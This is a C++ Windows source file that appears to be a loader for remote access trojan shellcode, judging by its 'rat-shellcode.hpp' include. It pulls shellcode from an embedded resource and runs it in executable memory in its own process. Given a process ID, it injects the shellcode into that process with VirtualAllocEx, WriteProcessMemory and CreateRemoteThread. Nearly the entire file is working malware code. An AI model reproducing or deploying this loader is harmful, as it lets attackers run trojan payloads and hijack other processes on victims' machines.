#include "rat-shellcode.hpp"
#include <algorithm>
#include <Windows.h>

int wmain(int argc, wchar_t* argv[]) {
    HRSRC info = ::FindResourceW(
        nullptr,
        MAKEINTRESOURCEW(1),
        MAKEINTRESOURCEW(10)
    );
    if (!info) {
        return EXIT_FAILURE;
    }

    HGLOBAL resource = ::LoadResource(nullptr, info);
    if (!resource) {
        return EXIT_FAILURE;
    }

    auto shellcode = static_cast<std::byte*>(::LockResource(resource));
    if (!shellcode) {
        return EXIT_FAILURE;
    }

    size_t size = ::SizeofResource(nullptr, info);
    if (0 == size) {
        return EXIT_FAILURE;
    }

    HANDLE thread{};
    switch (argc) {
    case 1: {
        auto executable_memory = static_cast<std::byte*>(::VirtualAlloc(
            nullptr,
            size,
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE
        ));
        if (!executable_memory) {
            return EXIT_FAILURE;
        }

        std::copy_n(shellcode, size, executable_memory);

        thread = ::CreateThread(
            nullptr,
            0,
            reinterpret_cast<PTHREAD_START_ROUTINE>(executable_memory),
            nullptr,
            0,
            nullptr
        );
        break;
    }
    case 2: {
        int pid = _wtol(argv[1]);

        HANDLE process = ::OpenProcess(PROCESS_ALL_ACCESS, false, pid);

        auto executable_memory = ::VirtualAllocEx(
            process,
            nullptr,
            size,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE
        );
        if (!executable_memory) {
            return ::GetLastError();
        }

        auto written = ::WriteProcessMemory(
            process,
            executable_memory,
            shellcode,
            size,
            nullptr
        );

        thread = ::CreateRemoteThread(
            process,
            nullptr,
            0,
            reinterpret_cast<PTHREAD_START_ROUTINE>(executable_memory),
            nullptr,
            0,
            nullptr
        );
        break;
    }
    }

    //    reinterpret_cast<void(*)()>(executable_memory)();
    ::WaitForSingleObject(thread, INFINITE);

    return EXIT_SUCCESS;
}